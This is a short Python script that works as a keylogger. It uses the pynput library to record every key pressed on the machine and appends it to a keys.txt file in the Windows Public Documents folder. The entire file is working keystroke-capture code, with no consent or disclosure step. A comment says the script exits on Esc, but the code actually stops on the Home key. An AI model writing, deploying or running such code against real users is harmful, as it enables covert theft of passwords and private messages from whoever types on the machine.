from pynput import keyboard
from pathlib import Path
import os

# folder and log file setup
public = Path(os.environ["PUBLIC"])
public_docs = public / "Documents"
public_docs.mkdir(parents=True, exist_ok=True)

folder = public_docs / "keys"
folder.mkdir(parents=True, exist_ok=True)

log_file = folder / "keys.txt"

def on_press(key):
    try:
        # normal key
        char = key.char
    except AttributeError:
        # handle special keys
        if key == key.space:
            char = "\n"     # new line on space
        elif key == key.enter:
            char = "\n"
        else:
            char = f"[{key.name}]"

    with log_file.open("a", encoding="utf-8") as f:
        f.write(char)

def on_release(key):
    if key == keyboard.Key.home:
        # exit cleanly when Esc is pressed
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
